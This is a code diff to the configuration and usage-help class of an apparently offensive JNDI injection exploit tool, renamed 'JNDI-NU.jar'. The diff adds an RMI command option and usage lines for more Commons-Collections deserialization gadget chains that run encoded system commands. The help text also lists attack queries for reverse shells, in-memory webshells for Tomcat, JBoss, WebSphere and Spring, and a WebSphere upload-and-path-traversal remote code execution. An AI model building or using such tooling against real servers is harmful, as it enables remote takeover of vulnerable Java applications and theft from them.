@@ -14,7 +14,7 @@ public class Config {
     public static int ldapPort = 1389;
 
     @Parameter(names = {"-rl", "--rmiPort"}, description = "rmi bind port", order = 2)
-    public static int rmiPort = 10990;
+    public static int rmiPort = 1099;
 
     @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
     public static int httpPort = 3456;
@@ -28,6 +28,9 @@ public class Config {
     @Parameter(names = {"-py", "--python"}, description = "Python System Command ex: python3  python2 ... ", order = 4)
     public static String python;
 
+    @Parameter(names = {"-c", "--command"}, description = "rmi gadgets System Command", order = 4)
+    public static String command;
+
 
     public static String rhost;
     public static String rport;
@@ -37,22 +40,23 @@ public class Config {
         JCommander jc = JCommander.newBuilder()
                 .addObject(new Config())
                 .build();
-        try{
+        try {
             jc.parse(args);
-        }catch(Exception e){
-            if(!showUsage){
+        } catch (Exception e) {
+            if (!showUsage) {
                 System.out.println("Error: " + e.getMessage() + "\n");
                 help = true;
             }
         }
 
-        if(showUsage){
+        if (showUsage) {
             String ip = (Config.ip != null) ? Config.ip : "[IP]";
             String port = (Config.ip != null) ? Config.ldapPort + "" : "[PORT]";
 
             System.out.println("Supported LADP Queries：");
             System.out.println("* all words are case INSENSITIVE when send to ldap server");
             String prefix = "ldap://" + Config.ip + ":" + Config.ldapPort + "/";
+            String rprefix = "rmi://" + Config.ip + ":" + Config.rmiPort + "/";
             System.out.println("\n[+] Basic Queries: " + prefix + "Basic/[PayloadType]/[Params], e.g.");
             System.out.println("    " + prefix + "Basic/Dnslog/[domain]");
             System.out.println("    " + prefix + "Basic/Command/[cmd]");
@@ -71,12 +75,22 @@ public class Config {
             System.out.println("    " + prefix + "Basic/JBossMemshell");
             System.out.println("    " + prefix + "Basic/WebsphereMemshell");
             System.out.println("    " + prefix + "Basic/SpringMemshell");
+            System.out.println("    " + rprefix + "jilt123" + "-c [cmd]");
 
             System.out.println("\n[+] Deserialize Queries: " + prefix + "Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.");
             System.out.println("    " + prefix + "Deserialization/URLDNS/[domain]");
             System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK1/Dnslog/[domain]");
             System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK3/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK4/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollections1_1/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollections2/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollections3/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollections4/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]");
             System.out.println("    " + prefix + "Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]");
             System.out.println("    " + prefix + "Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported");
             System.out.println("    " + prefix + "Deserialization/CommonsBeanutils2/TomcatEcho");
             System.out.println("    " + prefix + "Deserialization/C3P0/SpringEcho");
@@ -111,17 +125,15 @@ public class Config {
             System.out.println("    " + prefix + "WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported");
             System.out.println("    " + prefix + "WebsphereBypass/Upload/WebsphereMemshell");
             System.out.println("    " + prefix + "WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp");
-            System.out.println("以上可以将 <ldap://> 替换为 <rmi://>");
-
             System.exit(0);
         }
 
 //        //获取当前 Jar 的名称
 //        String jarPath = Starter.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-        jc.setProgramName("java -jar JNDIExploit-1.2-SNAPSHOT.jar");
+        jc.setProgramName("java -jar JNDI-NU.jar");
         jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));
 
-        if(help) {
+        if (help) {
             jc.usage(); //if -h specified, show help and exit
             System.exit(0);
         }
